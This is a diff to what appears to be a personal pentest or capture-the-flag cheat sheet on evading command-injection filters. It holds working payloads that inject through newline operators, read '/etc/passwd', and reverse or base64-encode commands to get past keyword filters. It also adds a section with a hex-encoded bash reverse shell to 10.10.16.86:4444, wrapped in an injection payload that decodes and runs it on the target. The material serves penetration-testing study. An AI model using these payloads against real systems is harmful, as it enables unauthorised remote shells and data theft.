@@ -36,7 +36,7 @@ Most common injection operators are blacklisted, but the **newline character (`%
 Sending a payload like `127.0.0.1%0a` is accepted and executes the command, meaning the newline is **not blacklisted** and can be used as an injection operator.
 #### Bypass Blacklisted Spaces
 ```bash
-ip=127.0.0.1+whomai #--> blocked
+ip=127.0.0.1;cat+/etc/passwd #--> blocked
 ```
 After getting a working operator, the next issue is the **space** character, which is also blacklisted.  
 Testing shows that adding a space after the newline causes an _invalid input_, meaning spaces are filtered.
@@ -248,21 +248,25 @@ $(a="WhOaMi";printf %s "${a,,}")
 ##### linux 
 Commands can be written **backwards** to evade keyword filters.
 - Reverse the string:
- ```bash
+```bash
 echo 'whoami' | rev   # -> imaohw
 # - Execute by reversing at runtime:
 $(rev<<<'imaohw')
 ```
+
 payload 
 ```bash
 ip=127.0.0.1&0a$(rev<<<'imaohw')
 ```
+
 ##### windows
 PowerShell equivalent:
 ```powershell
 "whoami"[-1..-20] -join ''        # imaohw
 iex "$('imaohw'[-1..-20] -join '')"
 ```
+
+
 #### Encoded Commands
 Encoding makes commands unrecognizable to filters.
 ##### Base64  (Linux)
@@ -285,6 +289,7 @@ ip=127.0.0.1%0abash<<<$(base64%09-d<<<ENCODEDSTRING)
 
 # 2. Decode + execute:
 iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64DATA')))"
+
 ```
 
 ---
@@ -303,7 +308,6 @@ iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64Str
 ```
 
 -  test the output with `bash -c '<payload>'` to confirm it works.
-
 
 #### Windows (DOSfuscation)
 
@@ -324,3 +328,20 @@ Invoke-DOSfuscation\Encoding> 1
 
 
 
+## evasive reverse shell 
+#### Method : Use Hex Encoding (Best Bypass)
+Hexadecimal only uses `0-9` and `a-f`, so it never contains special characters like `+`, `/`, or `=`. Your list contains the `xxd` binary, which can reverse hex strings.
+**payload format **
+```bash
+127.0.0.1%0abash<<<$(xxd${IFS}-r${IFS}-p<<<HEXDECIMAL
+```
+**HEXDECIMAL**
+```bash
+echo -n "bash -i >& /dev/tcp/10.10.16.86/4444 0>&1" | xxd -p
+# Output: 62617368202d69203e26202f6465762f7463702f31302e31302e31362e38362f3434343420303e2631
+```
+
+**Final Payload:** Use `xxd -r -p` (revert plain hex) to decode it on the target.
+```bash
+127.0.0.1%0abash<<<$(xxd${IFS}-r${IFS}-p<<<62617368202d69203e26202f6465762f7463702f31302e31302e31362e38362f3434343420303e2631)
+```
